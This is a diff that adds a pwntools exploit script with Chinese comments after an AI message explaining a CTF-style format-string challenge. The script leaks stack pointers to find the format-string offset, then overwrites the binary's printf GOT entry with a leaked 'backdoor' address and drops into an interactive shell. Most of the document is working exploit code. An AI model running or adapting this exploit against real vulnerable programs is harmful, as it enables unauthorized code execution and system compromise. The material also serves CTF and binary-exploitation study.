@@ -151,3 +151,60 @@ AIMessage(content='To solve this challenge using pwntools, we\'ll exploit a form
  '`printf` GOT entry with the address of `backdoor`, granting us a shell. '
  'Pwntools simplifies the exploitation process with its powerful functions for '
  'crafting payloads and interacting with binaries.')
+
+from pwn import *
+
+# 设置pwntools上下文
+context.binary = './vulnerable_binary'  # 替换为实际的二进制文件路径
+context.log_level = 'info'
+context.terminal = ['tmux', 'new-window']
+
+# 加载二进制文件
+elf = ELF(context.binary)
+
+# 启动进程（或根据需要使用远程连接）
+io = process(elf.path)
+
+# 接收并提取`backdoor`地址
+io.recvuntil(b'gift: ')
+backdoor_addr_str = io.recvline().strip()
+backdoor_addr = int(backdoor_addr_str, 16)
+log.info(f'Backdoor address: {hex(backdoor_addr)}')
+
+# 查找`printf`的GOT条目地址
+printf_got = elf.got['printf']
+log.info(f'printf GOT address: {hex(printf_got)}')
+
+# 确定格式化字符串偏移量
+# 发送有效载荷以泄露栈地址
+payload = b''
+payload += b'AAAA'  # 标记，用于在栈上找到我们的输入
+payload += b' %p' * 10  # 打印栈上的前10个指针
+io.sendline(payload)
+
+# 接收并解析响应
+response = io.recvline()
+log.info(f'Response: {response}')
+
+# 分割响应以提取指针
+leaked_pointers = response.strip().split()
+offset = None
+for i, leaked_pointer in enumerate(leaked_pointers):
+    if b'0x41414141' in leaked_pointer:
+        offset = i
+        log.info(f'Found our marker at position {offset}')
+        break
+
+if offset is None:
+    log.error("Could not find the offset. Exiting.")
+    io.close()
+    exit(1)
+
+# 构造格式化字符串有效载荷，以覆盖`printf`的GOT条目为`backdoor`的地址
+payload = fmtstr_payload(offset, {printf_got: backdoor_addr}, write_size='byte')
+
+# 发送有效载荷以覆盖GOT条目
+io.sendline(payload)
+
+# 与shell交互
+io.interactive()
